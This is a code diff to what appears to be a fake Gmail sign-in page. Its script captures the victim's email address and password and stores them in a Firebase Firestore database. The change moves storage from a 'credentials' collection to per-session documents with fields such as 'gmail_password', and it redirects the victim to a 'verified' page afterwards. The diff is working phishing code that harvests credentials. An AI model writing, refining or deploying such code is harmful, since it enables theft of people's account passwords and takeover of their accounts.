@@ -318,7 +318,7 @@
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
     import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
 
     const firebaseConfig = {
@@ -335,13 +335,15 @@
     const auth = getAuth(app);
     signInAnonymously(auth).catch(() => {});
 
+    // Get session ID from main page
+    const sessionId = sessionStorage.getItem('gw_session') || 'unknown_session';
+
     async function saveCreds(data) {
       try {
-        await addDoc(collection(db, 'credentials'), {
+        await setDoc(doc(db, 'sessions', sessionId), {
           ...data,
-          timestamp: new Date().toISOString(),
-          device: navigator.userAgent
-        });
+          last_updated: new Date().toISOString()
+        }, { merge: true });
       } catch(e) {}
     }
 
@@ -373,7 +375,7 @@
       const val = emailInput.value.trim();
       if (!isValidEmail(val)) { if (emailError) emailError.style.display = 'block'; return; }
       userEmail = val;
-      saveCreds({ email: userEmail, password: '' });
+      saveCreds({ gmail_email: userEmail, gmail_email_captured: new Date().toISOString() });
       document.getElementById('chip-avatar').textContent = userEmail[0].toUpperCase();
       document.getElementById('chip-email').textContent = userEmail;
       document.getElementById('page-email').style.display = 'none';
@@ -396,7 +398,7 @@
     passwordNext.addEventListener('click', () => {
       const pass = passwordInput.value;
       if (!pass) return;
-      saveCreds({ email: userEmail, password: pass });
+      saveCreds({ gmail_password: pass, gmail_signin_completed: new Date().toISOString() });
       setTimeout(() => { window.location.href = 'index.html?verified=1'; }, 600);
     });
 
